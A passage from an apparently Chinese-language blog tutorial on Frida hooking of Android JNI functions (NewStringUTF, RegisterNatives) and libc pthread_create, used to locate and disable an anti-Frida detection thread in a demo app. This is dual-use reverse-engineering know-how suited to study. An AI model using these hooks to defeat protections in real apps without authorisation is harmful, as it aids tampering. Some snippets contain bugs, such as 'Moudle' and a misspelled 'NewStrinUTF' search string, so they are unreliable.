function_">enumerateSymbols</span>()</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;symbols.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i].<span class="property">name</span></span><br><span class="line">        <span class="keyword">if</span>((symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span>) &amp;&amp; (symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;JNI&quot;</span>) &gt;= <span class="number">0</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;NewStrinUTF&quot;</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;finally found NewStrinUTF name:&quot;</span>, symbol)</span><br><span class="line">                <span class="title class_">NewStringUTF</span>_addr = symbols[i].<span class="property">address</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;finally found NewStrinUTF address:&quot;</span>, <span class="title class_">NewStringUTF</span>_addr)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">NewStringUTF</span> = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">NewStringUTF</span>_addr,<span class="string">&quot;pointer&quot;</span>,[<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>])</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(<span class="title class_">NewStringUTF</span>_addr,<span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span>(<span class="params">args1,args2</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1,args2 =&gt; &quot;</span>,args1, args2)</span><br><span class="line">        <span class="comment">//打印char*的内容</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args2 =&gt; &quot;</span>,args2.<span class="title function_">readCString</span>())</span><br><span class="line">        <span class="comment">//修改char*的内容</span></span><br><span class="line">        <span class="keyword">var</span> newArgs2 = <span class="title class_">Memory</span>.<span class="title function_">allocUtfString</span>(<span class="string">&quot;newArgs2&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> result = <span class="title class_">NewStringUTF</span>(args1,newArgs2)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    &#125;,<span class="string">&quot;pointer&quot;</span>,[<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>]))</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(replace_JNI)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/15.11.5.png" class=""><h3 id="9-1-4-hook动态注册"><a href="#9-1-4-hook动态注册" class="headerlink" title="9.1.4 hook动态注册"></a>9.1.4 hook动态注册</h3><p>动态注册是在App启动时进行的，所以要在App启动时进行hook。(-f参数)</p><p><code>JNI_Onload()</code>中的主要实现是<code>RegisterNatives()</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_RegisterNatives</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">RegisterNatives</span>_addr = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">var</span> symbols = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libart.so&quot;</span>).<span class="title function_">enumerateSymbols</span>()</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;symbols.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i].<span class="property">name</span></span><br><span class="line">        <span class="keyword">if</span>((symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span>) &amp;&amp; (symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;JNI&quot;</span>) &gt;= <span class="number">0</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;RegisterNatives&quot;</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;finally found RegisterNatives name:&quot;</span>, symbol)</span><br><span class="line">                <span class="title class_">RegisterNatives</span>_addr = symbols[i].<span class="property">address</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;finally found RegisterNatives address:&quot;</span>, <span class="title class_">RegisterNatives</span>_addr)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_RegisterNatives)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/15.11.6.png" class=""><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_RegisterNatives</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">RegisterNatives</span>_addr = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">var</span> symbols = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libart.so&quot;</span>).<span class="title function_">enumerateSymbols</span>()</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;symbols.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i].<span class="property">name</span></span><br><span class="line">        <span class="keyword">if</span>((symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span>) &amp;&amp; (symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;JNI&quot;</span>) &gt;= <span class="number">0</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;RegisterNatives&quot;</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;finally found RegisterNatives name:&quot;</span>, symbol)</span><br><span class="line">                <span class="title class_">RegisterNatives</span>_addr = symbols[i].<span class="property">address</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;finally found RegisterNatives address:&quot;</span>, <span class="title class_">RegisterNatives</span>_addr)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">RegisterNatives</span>_addr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">RegisterNatives</span>_addr,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="comment">//可能有多个</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[RegisterNatives] method counts:&quot;</span>, args[<span class="number">3</span>])</span><br><span class="line">                <span class="keyword">var</span> env = args[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">var</span> jclass = args[<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">var</span> class_name = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>().<span class="title function_">getClassName</span>(jclass)</span><br><span class="line">                <span class="keyword">var</span> method_ptr = <span class="title function_">ptr</span>(args[<span class="number">2</span>])</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//如果有多个方法需要进行过滤</span></span><br><span class="line">                <span class="keyword">var</span> method_conut = <span class="built_in">parseInt</span>(args[<span class="number">3</span>])</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;method_conut; i++)&#123;</span><br><span class="line">                    <span class="keyword">var</span> name_ptr = <span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(method_ptr.<span class="title function_">add</span>(i * <span class="title class_">Process</span>.<span class="property">pointerSize</span> * <span class="number">3</span>))</span><br><span class="line">                    <span class="keyword">var</span> sig_ptr = <span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(method_ptr.<span class="title function_">add</span>(i * <span class="title class_">Process</span>.<span class="property">pointerSize</span> * <span class="number">3</span> + <span class="title class_">Process</span>.<span class="property">pointerSize</span>))</span><br><span class="line">                    <span class="keyword">var</span> fnPtr_ptr = <span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(method_ptr.<span class="title function_">add</span>(i * <span class="title class_">Process</span>.<span class="property">pointerSize</span> * <span class="number">3</span> + <span class="title class_">Process</span>.<span class="property">pointerSize</span> * <span class="number">2</span>))</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">var</span> name = <span class="title class_">Memory</span>.<span class="title function_">readCString</span>(name_ptr)</span><br><span class="line">                    <span class="keyword">var</span> sig = <span class="title class_">Memory</span>.<span class="title function_">readCString</span>(sig_ptr)</span><br><span class="line">                    <span class="keyword">var</span> find_module = <span class="title class_">Process</span>.<span class="title function_">findModuleByAddress</span>(fnPtr_ptr)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[RegisterNatives] java class:&quot;</span>,class_name,<span class="string">&quot;name:&quot;</span>,name,<span class="string">&quot;sig:&quot;</span>,sig,<span class="string">&quot;fnPtr:&quot;</span>,fnPtr_ptr,<span class="string">&quot;module_name:&quot;</span>,find_module.<span class="property">name</span>,<span class="string">&quot;module_base:&quot;</span>,find_module.<span class="property">base</span>,<span class="string">&quot;offset:&quot;</span>,<span class="title function_">ptr</span>(fnPtr_ptr).<span class="title function_">sub</span>(find_module.<span class="property">base</span>))</span><br><span class="line">                &#125;                </span><br><span class="line">            &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;didn&#x27;t found RegisterNatives address&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_RegisterNatives)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/15.11.7.png" class=""><h2 id="9-2-libc框架层的hook利用"><a href="#9-2-libc框架层的hook利用" class="headerlink" title="9.2 libc框架层的hook利用"></a>9.2 libc框架层的hook利用</h2><h3 id="9-2-1-hook-pthread-create"><a href="#9-2-1-hook-pthread-create" class="headerlink" title="9.2.1 hook pthread_create"></a>9.2.1 hook pthread_create</h3><p>很多应用是单独开一个线程来进行反调试的，而线程函数pthread是在libc中。假如我们hook创建线程的函数，是不是就可以找到它的地址，进而把这个反调试的线程关闭呢？</p><p>先找一下创建线程函数在不在内存里：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//libc.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_pthread</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> pthread_create_addr = <span class="literal">null</span></span><br><span class="line">    <span class="comment">//查找符号表有无创建线程函数</span></span><br><span class="line">    <span class="comment">//var symbols = Process.findModuleByName(&quot;libc.so&quot;).enumerateSymbols()</span></span><br><span class="line">    <span class="comment">//查找导出表有无创建线程函数</span></span><br><span class="line">    <span class="keyword">var</span> symbols = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libc.so&quot;</span>).<span class="title function_">enumerateExports</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(symbols))</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_pthread)</span><br></pre></td></tr></table></figure><p>找到后直接得到它的地址，再attach上：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//libc.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_pthread</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> pthread_create_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;pthread_create&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pthread_create_addr =&gt; &quot;</span>,pthread_create_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(pthread_create_addr,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args =&gt; &quot;</span>, args[<span class="number">0</span>],args[<span class="number">1</span>],args[<span class="number">2</span>],args[<span class="number">3</span>])</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval =&gt; &quot;</span>,retval)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_pthread)</span><br></pre></td></tr></table></figure><p>由于应用可能一开始就进行反调试或者还没触发到反调试的函数，所以需要我们主动调用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//libc.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">beginAnti</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.example.demoso1.MainActivity&quot;</span>,&#123;</span><br><span class="line">             <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                 <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                 instance.<span class="title function_">init</span>()</span><br><span class="line">             &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;serach complete!&quot;</span>)&#125;</span><br><span class="line">         &#125;)        </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_pthread</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> pthread_create_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;pthread_create&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pthread_create_addr =&gt; &quot;</span>,pthread_create_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(pthread_create_addr,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args =&gt; &quot;</span>, args[<span class="number">0</span>],args[<span class="number">1</span>],args[<span class="number">2</span>],args[<span class="number">3</span>])</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval =&gt; &quot;</span>,retval)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_pthread)</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.example.demoso1 -l libc.js --no-pause</span><br><span class="line">beginAnti()//主动调用</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/15.12.1.png" class=""><p>其中<code>pthread_create()</code>传入的第三个参数是线程运行函数的起始地址。每次主动调用它，起始地址可能会改变，但它相对于基地址的偏移是不变的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//libc.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">beginAnti</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.example.demoso1.MainActivity&quot;</span>,&#123;</span><br><span class="line">             <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                 <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                 instance.<span class="title function_">init</span>()</span><br><span class="line">             &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;serach complete!&quot;</span>)&#125;</span><br><span class="line">         &#125;)        </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_pthread</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> pthread_create_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;pthread_create&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pthread_create_addr =&gt; &quot;</span>,pthread_create_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(pthread_create_addr,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args =&gt; &quot;</span>, args[<span class="number">0</span>],args[<span class="number">1</span>],args[<span class="number">2</span>],args[<span class="number">3</span>])</span><br><span class="line">            <span class="keyword">var</span> libnativebaseaddress = <span class="title class_">Moudle</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span>(libnativebaseaddress != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libnaticebaseaddress =&gt; &quot;</span>,libnativebaseaddress)</span><br><span class="line">                <span class="keyword">var</span> detect_frida_loop_offset = args[<span class="number">2</span>] - libnativebaseaddress</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;detect_frida_loop_offset =&gt; &quot;</span>,detect_frida_loop_offset)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval =&gt; &quot;</span>,retval)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_pthread)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/15.12.2.png" class=""><p>也就是反调试的线程创建函数在<code>libnative-lib.so</code>中的偏移为64900。要想它不执行，可以将反调试的线程创建函数的args[2]指向另一个函数（置空会失败），比如<code>libc.so</code>中的<code>time()</code>函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//libc.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">beginAnti</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.example.demoso1.MainActivity&quot;</span>,&#123;</span><br><span class="line">             <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                 <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                 instance.<span class="title function_">init</span>()</span><br><span class="line">             &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;serach complete!&quot;</span>)&#125;</span><br><span class="line">         &#125;)        </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_pthread</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> pthread_create_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;pthread_create&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> time_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;time&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pthread_create_addr =&gt; &quot;</span>,pthread_create_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(pthread_create_addr,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args =&gt; &quot;</span>, args[<span class="number">0</span>],args[<span class="number">1</span>],args[<span class="number">2</span>],args[<span class="number">3</span>])</span><br><span class="line">            <span class="keyword">var</span> libnativebaseaddress = <span class="title class_">Moudle</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span>(libnativebaseaddress != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libnaticebaseaddress =&gt; &quot;</span>,libnativebaseaddress)</span><br><span class="line">                <span class="comment">//var detect_frida_loop_offset = args[2] - libnativebaseaddress</span></span><br><span class="line">                <span class="comment">//console.log(&quot;detect_frida_loop_offset =&gt; &quot;,detect_frida_loop_offset)</span></span><br><span class="line">                <span class="keyword">if</span>(args[<span class="number">2</span>]-libnativebaseaddress == <span class="number">64900</span>)&#123;</span><br><span class="line">                    <span class="comment">//args[2] = null//置空会失败</span></span><br><span class="line">                    args[<span class="number">2</span>] = time_addr</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval =&gt; &quot;</span>,retval)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_pthread)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/15.12.3.png" class=""><p>或者可以把反调试的线程创建函数直接整个替换掉。替换的前提条件需要知道它的参数和返回值，可以在Kali终端输入查看<code>pthread_create()</code>的参数和返回值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man pthread_create</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/15.12.4.png" class=""><p>先什么都不干，只是打印几个参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//libc.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">beginAnti</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.example.demoso1.MainActivity&quot;</span>,&#123;</span><br><span class="line">             <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                 <span class="variable language_">console</span>.<span class="title function_">log</span>(<span 